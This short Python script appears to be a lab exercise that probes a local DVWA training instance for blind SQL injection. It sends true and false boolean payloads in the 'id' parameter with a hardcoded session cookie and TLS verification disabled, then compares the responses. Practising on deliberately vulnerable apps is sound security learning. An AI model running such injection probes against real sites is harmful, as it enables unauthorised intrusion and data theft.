import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://127.0.0.1/dvwa/vulnerabilities/sqli_blind/"
cookies = dict(security='low', PHPSESSID="t1kqiierd4f8fbrl83aveplg6h")

payload1 = {
    "id":"1' and '1'='1",
    "Submit":"Submit"
}
payload2 = {
    "id":"1' and '1'='2",
    "Submit":"Submit"
}

res1 = requests.get(url=url, params=payload1, cookies=cookies, verify=False)
res2 = requests.get(url=url, params=payload2, cookies=cookies, verify=False)

if res1.text != res2.text:
    print("It is Vulnerable!")
else:
    print("It is not Vulnerable!")